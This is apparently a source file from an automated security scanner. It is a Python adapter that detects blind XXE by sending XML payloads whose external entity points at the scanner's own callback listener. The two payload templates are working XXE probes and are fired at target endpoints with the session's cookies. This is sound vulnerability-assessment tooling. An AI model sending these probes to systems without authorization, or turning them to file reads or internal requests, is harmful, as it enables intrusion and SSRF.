"""Blind XXE / XML-injection adapter (detection, active) via out-of-band callback.

XML External Entity injection is usually BLIND on hardened parsers: the classic file-read is
reflected only when the app echoes parsed content, which modern apps don't. This adapter proves
the parser resolves EXTERNAL ENTITIES by pointing an entity's SYSTEM url at a local OastServer and
watching for the callback.

SAFE BY DESIGN: the external entity targets OUR listener ONLY (never file:// and never an internal
host), so nothing sensitive is ever read or exfiltrated - a callback merely proves external-entity
resolution (the XXE precondition, and SSRF-via-XXE). No destructive payloads. Auth endpoints are
skipped. Requires options["oast_host_ip"] = an interface the target can reach. active=True
(authorization-gated by the caller/policy). Generic across any XML endpoint, not target-specific.
"""
from __future__ import annotations

import time
from urllib.parse import urlsplit

import httpx

from ...oast import OAST_BODY_TOKEN, OastServer
from ...safety import is_auth_endpoint
from .base import AdapterResult, RunContext, ToolAdapter, register
from .session_util import _cookie_header

# Path hints for endpoints that most often accept XML/SOAP; tried first (then everything else).
_XML_HINT = (".asmx", ".svc", ".ashx", "/soap", "/xml", "/rpc", "/api/", "/ws/", "/services/")


def xxe_bodies(callback: str) -> list[str]:
    """Two non-destructive blind-XXE payloads (general entity + parameter entity), each with its
    SYSTEM url pointing at OUR OAST listener. No file:// / internal targets."""
    return [
        ('<?xml version="1.0" encoding="UTF-8"?>\n'
         f'<!DOCTYPE root [ <!ENTITY xxe SYSTEM "{callback}"> ]>\n'
         '<root><x>&xxe;</x></root>'),
        ('<?xml version="1.0" encoding="UTF-8"?>\n'
         f'<!DOCTYPE root [ <!ENTITY % xxe SYSTEM "{callback}"> %xxe; ]>\n'
         '<root><x>test</x></root>'),
    ]


@register
class XxeOastAdapter(ToolAdapter):
    name = "xxe_oast"
    stage = "scan"
    discovers = False
    detects = True
    active = True
    binary = None  # pure-python

    def run(self, ctx: RunContext) -> AdapterResult:
        host_ip = ctx.options.get("oast_host_ip")
        if not host_ip:
            return AdapterResult(tool=self.name, ok=False,
                                 note="no oast_host_ip configured (interface the target can reach)")
        origin = ""
        try:
            sp = urlsplit(ctx.target)
            origin = f"{sp.scheme}://{sp.netloc}"
        except Exception:  # noqa: BLE001
            pass
        pool = []
        for u in (ctx.seed_urls or [ctx.target]):
            if origin and not u.startswith(origin):
                continue
            if is_auth_endpoint(u):
                continue
            pool.append(u.split("?")[0])
        pool = list(dict.fromkeys(pool))
        pool.sort(key=lambda u: 0 if any(h in u.lower() for h in _XML_HINT) else 1)
        pool = pool[:int(ctx.options.get("xxe_cap", 60))]
        if not pool:
            return AdapterResult(tool=self.name, ok=True, note="no candidate endpoints")
        cmd = f"xxe-oast over {len(pool)} endpoint(s) via {host_ip}"
        if ctx.dry_run:
            return AdapterResult(tool=self.name, ok=True, command=cmd, note="dry-run")

        cookie = _cookie_header(ctx.session, ctx.target)
        headers = {"Content-Type": "application/xml"}
        if cookie:
            headers["Cookie"] = cookie
        timeout = ctx.options.get("http_timeout", 12)
        settle = float(ctx.options.get("oast_settle", 6))
        findings: list[dict] = []
        probes: list[tuple[str, str, bool]] = []   # (token, url, reflected)
        # Two-pass so ASYNCHRONOUS callbacks aren't missed: inject every probe, then wait `settle`
        # for out-of-band fetches to land before confirming (same model as the RFI OAST adapter).
        with OastServer(port=ctx.options.get("oast_port", 0)) as oast:
            with httpx.Client(verify=False, follow_redirects=True, timeout=timeout) as client:
                for i, url in enumerate(pool):
                    token = f"xxe{i}x{abs(hash(url)) % 100000}"
                    callback = oast.probe_url(host_ip, token)
                    reflected = False
                    for body in xxe_bodies(callback):
                        try:
                            r = client.post(url, content=body.encode(), headers=headers)
                            if OAST_BODY_TOKEN in (r.text or ""):
                                reflected = True
                        except Exception:  # noqa: BLE001
                            continue
                    probes.append((token, url, reflected))
            time.sleep(settle)
            for token, url, reflected in probes:
                called_back = oast.saw(token)
                if called_back or reflected:
                    channel = "+".join(part for part in (
                        "oast-callback" if called_back else "",
                        "in-band" if reflected else "") if part)
                    findings.append({
                        "type": "xxe", "url": url, "matched-at": url, "channel": channel,
                        "evidence": "XML parser resolved an external entity pointing at our listener "
                                    "(external-entity resolution enabled - XXE / SSRF-via-XXE)"
                                    + (" and reflected it in-band" if reflected else ""),
                    })
        return AdapterResult(tool=self.name, ok=True, findings=findings, command=cmd,
                             note=f"{len(findings)} confirmed XXE over {len(probes)} probe(s)")
